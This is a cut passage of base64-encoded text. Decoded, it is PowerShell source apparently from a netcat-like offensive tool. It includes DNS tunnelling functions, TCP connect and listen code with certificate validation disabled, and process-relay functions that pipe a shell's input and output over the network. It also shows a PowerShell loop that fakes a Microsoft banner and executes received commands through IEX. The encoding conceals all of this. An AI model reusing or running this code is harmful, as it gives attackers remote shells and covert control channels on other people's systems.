pbUVuZCgiLiIpCiAgICAgICAgICAgICAgICAgICAgJFBhY2tldENvdW50ID0gMAogICAgICAgICAgICAgICAgICAgICRTZWN0aW9uQ291bnQgPSAwCiAgICAgICAgICAgICAgICAgICAgJFBhY2tldERhdGEgPSAiIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJFBhY2tldERhdGEgKz0gJENoYXIKICAgICAgICAgICAgICAgICRTZWN0aW9uQ291bnQgKz0gMgogICAgICAgICAgICAgICAgJFBhY2tldENvdW50ICs9IDIKICAgICAgICAgICAgfQogICAgICAgICAgICAkUGFja2V0RGF0YSA9ICRQYWNrZXREYXRhLlRyaW1FbmQoIi4iKQogICAgICAgICAgICAkUGFja2V0c0RhdGEgKz0gJFBhY2tldERhdGEKICAgICAgICAgICAgJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICIiCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkUGFja2V0c0RhdGEgPSBAKCIiKQogICAgICAgIH0KICAgIAogICAgICAgIFtieXRlW11dJFJldHVybmluZ0RhdGEgPSBAKCkKICAgICAgICBmb3JlYWNoICgkUGFja2V0RGF0YSBpbiAkUGFja2V0c0RhdGEpIHsKICAgICAgICAgICAgdHJ5IHskTVNHUGFja2V0ID0gSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJDcmVhdGVfTVNHIl0gLUFyZ3VtZW50TGlzdCBAKCRGdW5jVmFyc1siU2Vzc2lvbklkIl0sICRGdW5jVmFyc1siU2VxTnVtIl0sICRGdW5jVmFyc1siQWNrTnVtIl0sICRQYWNrZXREYXRhLCAkRnVuY1ZhcnNbIlRhZyJdLCAkRnVuY1ZhcnNbIkRvbWFpbiJdKX0KICAgICAgICAgICAgY2F0Y2ggeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsZWQgdG8gY3JlYXRlIHBhY2tldC4iIDsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9CiAgICAgICAgICAgIHRyeSB7JFBhY2tldCA9IChJbnZva2UtQ29tbWFuZCAkRnVuY1ZhcnNbIlNlbmRQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJE1TR1BhY2tldCwgJEZ1bmNWYXJzWyJETlNTZXJ2ZXIiXSwgJEZ1bmNWYXJzWyJETlNQb3J0Il0pKX0KICAgICAgICAgICAgY2F0Y2ggeyBXcml0ZS1WZXJib3NlICJETlNDQVQyOiBGYWlsZWQgdG8gc2VuZCBwYWNrZXQuIiA7ICRGdW5jVmFyc1siRmFpbHVyZXMiXSArPSAxIDsgY29udGludWUgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJERlY29kZWRQYWNrZXQgPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJEZWNvZGVQYWNrZXQiXSAtQXJndW1lbnRMaXN0IEAoJFBhY2tldCkpCiAgICAgICAgICAgICAgICBpZiAoJERlY29kZWRQYWNrZXQuTGVuZ3RoIC1uZSA0KSB7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWx1cmUgdG8gZGVjb2RlIHBhY2tldCwgZHJvcHBpbmcuLi4iOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAkRGVjb2RlZFBhY2tldFsyXQogICAgICAgICAgICAgICAgJEZ1bmNWYXJzWyJTZXFOdW0iXSA9ICREZWNvZGVkUGFja2V0WzNdCiAgICAgICAgICAgICAgICAkUmV0dXJuaW5nRGF0YSArPSAkRGVjb2RlZFBhY2tldFsxXQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsgV3JpdGUtVmVyYm9zZSAiRE5TQ0FUMjogRmFpbHVyZSB0byBkZWNvZGUgcGFja2V0LCBkcm9wcGluZy4uLiIgOyAkRnVuY1ZhcnNbIkZhaWx1cmVzIl0gKz0gMSA7IGNvbnRpbnVlIH0KICAgICAgICAgICAgaWYgKCREZWNvZGVkUGFja2V0IC1lcSAxKSB7IFdyaXRlLVZlcmJvc2UgIkROU0NBVDI6IEZhaWx1cmUgdG8gZGVjb2RlIHBhY2tldCwgZHJvcHBpbmcuLi4iIDsgJEZ1bmNWYXJzWyJGYWlsdXJlcyJdICs9IDEgOyBjb250aW51ZSB9CiAgICAgICAgfQogICAgCiAgICAgICAgaWYgKCRGdW5jVmFyc1siRmFpbHVyZXMiXSAtZ2UgJEZ1bmNWYXJzWyJGYWlsdXJlVGhyZXNob2xkIl0pIHticmVha30KICAgIAogICAgICAgIGlmICgkUmV0dXJuaW5nRGF0YSAtbmUgQCgpKSB7CiAgICAgICAgICAgICRGdW5jVmFyc1siQWNrTnVtIl0gPSAoSW52b2tlLUNvbW1hbmQgJEZ1bmNWYXJzWyJBY2tEYXRhIl0gLUFyZ3VtZW50TGlzdCBAKCRSZXR1cm5pbmdEYXRhLCAkRnVuY1ZhcnNbIkFja051bSJdKSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRSZXR1cm5pbmdEYXRhLCAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFdyaXRlRGF0YV9ETlMgewogICAgICAgIHBhcmFtKCREYXRhLCAkRnVuY1ZhcnMpCiAgICAgICAgJEZ1bmNWYXJzWyJJbnB1dERhdGEiXSA9ICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpCiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gQ2xvc2VfRE5TIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgJEZJTlBhY2tldCA9IEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siQ3JlYXRlX0ZJTiJdIC1Bcmd1bWVudExpc3QgQCgkRnVuY1ZhcnNbIlNlc3Npb25JZCJdLCAkRnVuY1ZhcnNbIlRhZyJdLCAkRnVuY1ZhcnNbIkRvbWFpbiJdKQogICAgICAgIEludm9rZS1Db21tYW5kICRGdW5jVmFyc1siU2VuZFBhY2tldCJdIC1Bcmd1bWVudExpc3QgQCgkRklOUGFja2V0LCAkRnVuY1ZhcnNbIkROU1NlcnZlciJdLCAkRnVuY1ZhcnNbIkROU1BvcnQiXSkgfCBPdXQtTnVsbAogICAgfQogICAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIFRDUCBGVU5DVElPTlMgIyMjIyMjIyMjIwogICAgZnVuY3Rpb24gU2V0dXBfVENQIHsKICAgICAgICBwYXJhbSgkRnVuY1NldHVwVmFycykKICAgICAgICAkYywgJGwsICRwLCAkdCA9ICRGdW5jU2V0dXBWYXJzCiAgICAgICAgaWYgKCRnbG9iYWw6VmVyYm9zZSkgeyRWZXJib3NlID0gJFRydWV9CiAgICAgICAgJEZ1bmNWYXJzID0gQHt9CiAgICAgICAgaWYgKCEkbCkgewogICAgICAgICAgICAkRnVuY1ZhcnNbImwiXSA9ICRGYWxzZQogICAgICAgICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNvbm5lY3RpbmcuLi4iCiAgICAgICAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQ29ubmVjdCgkYywgJHAsICRudWxsLCAkbnVsbCkKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRGdW5jVmFyc1sibCJdID0gJFRydWUKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkxpc3RlbmluZyBvbiBbMC4wLjAuMF0gKHBvcnQgIiArICRwICsgIikiKQogICAgICAgICAgICAkU29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwTGlzdGVuZXIgJHAKICAgICAgICAgICAgJFNvY2tldC5TdGFydCgpCiAgICAgICAgICAgICRIYW5kbGUgPSAkU29ja2V0LkJlZ2luQWNjZXB0VGNwQ2xpZW50KCRudWxsLCAkbnVsbCkKICAgICAgICB9CiAgICAKICAgICAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgd2hpbGUgKCRUcnVlKSB7CiAgICAgICAgICAgIGlmICgkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUpIHsKICAgICAgICAgICAgICAgIGlmIChAKDE3LCAyNykgLWNvbnRhaW5zICgkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJOb0VjaG8sSW5jbHVkZUtleURvd24iKS5WaXJ0dWFsS2V5Q29kZSkpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDVFJMIG9yIEVTQyBjYXVnaHQuIFN0b3BwaW5nIFRDUCBTZXR1cC4uLiIKICAgICAgICAgICAgICAgICAgICBpZiAoJEZ1bmNWYXJzWyJsIl0pIHskU29ja2V0LlN0b3AoKX0KICAgICAgICAgICAgICAgICAgICBlbHNlIHskU29ja2V0LkNsb3NlKCl9CiAgICAgICAgICAgICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkgewogICAgICAgICAgICAgICAgaWYgKCEkbCkgeyRTb2NrZXQuQ2xvc2UoKX0KICAgICAgICAgICAgICAgIGVsc2UgeyRTb2NrZXQuU3RvcCgpfQogICAgICAgICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlRpbWVvdXQhIiA7IGJyZWFrCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSGFuZGxlLklzQ29tcGxldGVkKSB7CiAgICAgICAgICAgICAgICBpZiAoISRsKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTb2NrZXQuRW5kQ29ubmVjdCgkSGFuZGxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN0cmVhbSA9ICRTb2NrZXQuR2V0U3RyZWFtKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRCdWZmZXJTaXplID0gJFNvY2tldC5SZWNlaXZlQnVmZmVyU2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gdG8gIiArICRjICsgIjoiICsgJHAgKyAiIFt0Y3BdIHN1Y2NlZWRlZCEiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRzc2wpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNlY3VyaXR5LlNzbFN0cmVhbSgkU3RyZWFtLCAkZmFsc2UsIHsgcGFyYW0oJFNlbmRlciwgJENlcnQsICRDaGFpbiwgJFBvbGljeSkgcmV0dXJuICR0cnVlIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN0cmVhbS5BdXRoZW50aWNhdGVBc0NsaWVudCgkU3NsQ24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiQ29ubmVjdGlvbiB0byBTU0wgc3VjY2VkZWQhIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7JFNvY2tldC5DbG9zZSgpOyAkU3RvcHdhdGNoLlN0b3AoKTsgYnJlYWt9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkQ2xpZW50ID0gJFNvY2tldC5FbmRBY2NlcHRUY3BDbGllbnQoJEhhbmRsZSkKICAgICAgICAgICAgICAgICAgICAkU3RyZWFtID0gJENsaWVudC5HZXRTdHJlYW0oKQogICAgICAgICAgICAgICAgICAgICRCdWZmZXJTaXplID0gJENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCJDb25uZWN0aW9uIGZyb20gWyIgKyAkQ2xpZW50LkNsaWVudC5SZW1vdGVFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHBvcnQgKyAiIFt0Y3BdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJENsaWVudC5DbGllbnQuUmVtb3RlRW5kUG9pbnQuUG9ydCArICIpIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkKICAgICAgICBpZiAoJFNvY2tldCAtZXEgJG51bGwpIHticmVha30KICAgICAgICAkRnVuY1ZhcnNbIlN0cmVhbSJdID0gJFN0cmVhbQogICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0gPSAkU29ja2V0CiAgICAgICAgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0gPSAkQnVmZmVyU2l6ZQogICAgICAgICRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSA9IChOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0pCiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlN0cmVhbSJdLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sIDAsICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLCAkbnVsbCwgJG51bGwpCiAgICAgICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW1CeXRlc1JlYWQiXSA9IDEKICAgICAgICByZXR1cm4gJEZ1bmNWYXJzCiAgICB9CiAgICBmdW5jdGlvbiBSZWFkRGF0YV9UQ1AgewogICAgICAgIHBhcmFtKCRGdW5jVmFycykKICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgaWYgKCRGdW5jVmFyc1siU3RyZWFtQnl0ZXNSZWFkIl0gLWVxIDApIHticmVha30KICAgICAgICBpZiAoJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpIHsKICAgICAgICAgICAgJFN0cmVhbUJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siU3RyZWFtIl0uRW5kUmVhZCgkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSkKICAgICAgICAgICAgaWYgKCRTdHJlYW1CeXRlc1JlYWQgLWVxIDApIHticmVha30KICAgICAgICAgICAgJERhdGEgPSAkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0cmVhbUJ5dGVzUmVhZCAtIDEpXQogICAgICAgICAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU3RyZWFtIl0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sICRudWxsLCAkbnVsbCkKICAgICAgICB9CiAgICAgICAgcmV0dXJuICREYXRhLCAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFdyaXRlRGF0YV9UQ1AgewogICAgICAgIHBhcmFtKCREYXRhLCAkRnVuY1ZhcnMpCiAgICAgICAgJEZ1bmNWYXJzWyJTdHJlYW0iXS5Xcml0ZSgkRGF0YSwgMCwgJERhdGEuTGVuZ3RoKQogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIENsb3NlX1RDUCB7CiAgICAgICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgICAgIHRyeSB7JEZ1bmNWYXJzWyJTdHJlYW0iXS5DbG9zZSgpfQogICAgICAgIGNhdGNoIHt9CiAgICAgICAgaWYgKCRGdW5jVmFyc1sibCJdKSB7JEZ1bmNWYXJzWyJTb2NrZXQiXS5TdG9wKCl9CiAgICAgICAgZWxzZSB7JEZ1bmNWYXJzWyJTb2NrZXQiXS5DbG9zZSgpfQogICAgfQogICAgIyMjIyMjIyMjIyBUQ1AgRlVOQ1RJT05TICMjIyMjIyMjIyMKICAKICAgICMjIyMjIyMjIyMgQ01EIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgICBmdW5jdGlvbiBTZXR1cF9DTUQgewogICAgICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQogICAgICAgIGlmICgkZ2xvYmFsOlZlcmJvc2UpIHskVmVyYm9zZSA9ICRUcnVlfQogICAgICAgICRGdW5jVmFycyA9IEB7fQogICAgICAgICRQcm9jZXNzU3RhcnRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbwogICAgICAgICRQcm9jZXNzU3RhcnRJbmZvLkZpbGVOYW1lID0gJEZ1bmNTZXR1cFZhcnNbMF0KICAgICAgICAkUHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkRmFsc2UKICAgICAgICAkUHJvY2Vzc1N0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkSW5wdXQgPSAkVHJ1ZQogICAgICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSAkVHJ1ZQogICAgICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9ICRUcnVlCiAgICAgICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0gPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkUHJvY2Vzc1N0YXJ0SW5mbykKICAgICAgICBXcml0ZS1WZXJib3NlICgiU3RhcnRpbmcgUHJvY2VzcyAiICsgJEZ1bmNTZXR1cFZhcnNbMF0gKyAiLi4uIikKICAgICAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFydCgpIHwgT3V0LU51bGwKICAgICAgICAkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYKICAgICAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkKICAgICAgICAkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYKICAgICAgICAkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQogICAgICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFJlYWREYXRhX0NNRCB7CiAgICAgICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgICAgIFtieXRlW11dJERhdGEgPSBAKCkKICAgICAgICBpZiAoJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpIHsKICAgICAgICAgICAgJFN0ZE91dEJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uRW5kUmVhZCgkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSkKICAgICAgICAgICAgaWYgKCRTdGRPdXRCeXRlc1JlYWQgLWVxIDApIHticmVha30KICAgICAgICAgICAgJERhdGEgKz0gJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdGRPdXRCeXRlc1JlYWQgLSAxKV0KICAgICAgICAgICAgJEZ1bmNWYXJzWyJTdGRPdXRSZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZE91dHB1dC5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpCiAgICAgICAgfQogICAgICAgIGlmICgkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkgewogICAgICAgICAgICAkU3RkRXJyQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkVuZFJlYWQoJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0pCiAgICAgICAgICAgIGlmICgkU3RkRXJyQnl0ZXNSZWFkIC1lcSAwKSB7YnJlYWt9CiAgICAgICAgICAgICREYXRhICs9ICRGdW5jVmFyc1siU3RkRXJyRGVzdGluYXRpb25CdWZmZXIiXVswLi4oW2ludF0kU3RkRXJyQnl0ZXNSZWFkIC0gMSldCiAgICAgICAgICAgICRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpCiAgICAgICAgfQogICAgICAgIHJldHVybiAkRGF0YSwgJEZ1bmNWYXJzCiAgICB9CiAgICBmdW5jdGlvbiBXcml0ZURhdGFfQ01EIHsKICAgICAgICBwYXJhbSgkRGF0YSwgJEZ1bmNWYXJzKQogICAgICAgICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkSW5wdXQuV3JpdGVMaW5lKCRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpLlRyaW1FbmQoImByIikuVHJpbUVuZCgiYG4iKSkKICAgICAgICByZXR1cm4gJEZ1bmNWYXJzCiAgICB9CiAgICBmdW5jdGlvbiBDbG9zZV9DTUQgewogICAgICAgIHBhcmFtKCRGdW5jVmFycykKICAgICAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXSB8IFN0b3AtUHJvY2VzcwogICAgfSAgCiAgICAjIyMjIyMjIyMjIENNRCBGVU5DVElPTlMgIyMjIyMjIyMjIwogIAogICAgIyMjIyMjIyMjIyBQT1dFUlNIRUxMIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgICBmdW5jdGlvbiBNYWluX1Bvd2Vyc2hlbGwgewogICAgICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzKSAgIAogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRlbmNvZGluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICAgICAgICBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSBAKCkKICAgICAgICAgICAgaWYgKCRpIC1uZSAkbnVsbCkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5wdXQgZnJvbSAtaSBkZXRlY3RlZC4uLiIKICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJGkpIHsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gKFtpby5maWxlXTo6UmVhZEFsbEJ5dGVzKCRpKSkgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkaS5HZXRUeXBlKCkuTmFtZSAtZXEgIkJ5dGVbXSIpIHsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gJGkgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkaS5HZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gJEVuY29kaW5nLkdldEJ5dGVzKCRpKSB9CiAgICAgICAgICAgICAgICBlbHNlIHtXcml0ZS1Ib3N0ICJVbnJlY29nbmlzZWQgaW5wdXQgdHlwZS4iIDsgcmV0dXJufQogICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMS4uLiAoRVNDL0NUUkwgdG8gZXhpdCkiCiAgICAgICAgICAgIHRyeSB7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9TZXR1cCAkU3RyZWFtMVNldHVwVmFyc30KICAgICAgICAgICAgY2F0Y2gge1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAxIFNldHVwIEZhaWx1cmUiIDsgcmV0dXJufQogICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMi4uLiAoRVNDL0NUUkwgdG8gZXhpdCkiCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkSW50cm9Qcm9tcHQgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoIldpbmRvd3MgUG93ZXJTaGVsbGBuQ29weXJpZ2h0IChDKSAyMDEzIE1pY3Jvc29mdCBDb3Jwb3JhdGlvbi4gQWxsIHJpZ2h0cyByZXNlcnZlZC5gbmBuIiArICgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKSkKICAgICAgICAgICAgICAgICRQcm9tcHQgPSAoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikKICAgICAgICAgICAgICAgICRDb21tYW5kVG9FeGVjdXRlID0gIiIgICAgICAKICAgICAgICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTdHJlYW0gMiBTZXR1cCBGYWlsdXJlIiA7IHJldHVybgogICAgICAgICAgICB9CiAgICAgIAogICAgICAgICAgICBpZiAoJElucHV0VG9Xcml0ZSAtbmUgQCgpKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJXcml0aW5nIGlucHV0IHRvIFN0cmVhbSAxLi4uIgogICAgICAgICAgICAgICAgdHJ5IHskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkSW5wdXRUb1dyaXRlICRTdHJlYW0xVmFyc30KICAgICAgICAgICAgICAgIGNhdGNoIHtXcml0ZS1Ib3N0ICJGYWlsZWQgdG8gd3JpdGUgaW5wdXQgdG8gU3RyZWFtIDEiIDsgcmV0dXJufQogICAgICAgICAgICB9CiAgICAgIAogICAgICAgICAgICBpZiAoJGQpIHtXcml0ZS1WZXJib3NlICItZCAoZGlzY29ubmVjdCkgQWN0aXZhdGVkLiBEaXNjb25uZWN0aW5nLi4uIiA7IHJldHVybn0KICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiIKICAgICAgICAgICAgd2hpbGUgKCRUcnVlKSB7ICAgICAgICAKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgIyMjIyMgU3RyZWFtMiBSZWFkICMjIyMjCiAgICAgICAgICAgICAgICAgICAgJFByb21wdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgJFJldHVybmVkRGF0YSA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgaWYgKCRDb21tYW5kVG9FeGVjdXRlIC1uZSAiIikgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkge1tieXRlW11dJFJldHVybmVkRGF0YSA9ICRFbmNvZGluZy5HZXRCeXRlcygoSUVYICRDb21tYW5kVG9FeGVjdXRlIDI+JjEgfCBPdXQtU3RyaW5nKSl9CiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHtbYnl0ZVtdXSRSZXR1cm5lZERhdG